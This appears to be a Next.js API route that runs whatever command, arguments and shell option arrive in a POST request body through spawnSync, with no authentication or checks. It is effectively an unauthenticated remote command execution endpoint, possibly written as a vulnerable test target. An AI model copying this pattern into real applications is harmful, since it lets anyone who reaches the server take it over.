import { NextResponse } from 'next/server'
import { spawnSync } from 'child_process'

export const dynamic = 'force-dynamic'

export async function POST (request) {
  const body = await request.json()

  const options = { shell: !!body?.options?.shell }
  const reqArgs = body?.args

  let args
  if (typeof reqArgs === 'string') {
    args = reqArgs.split(' ')
  } else {
    args = reqArgs
  }

  const response = spawnSync(body?.command, args, options)

  return NextResponse.json({ mesage: 'OK', response })
}
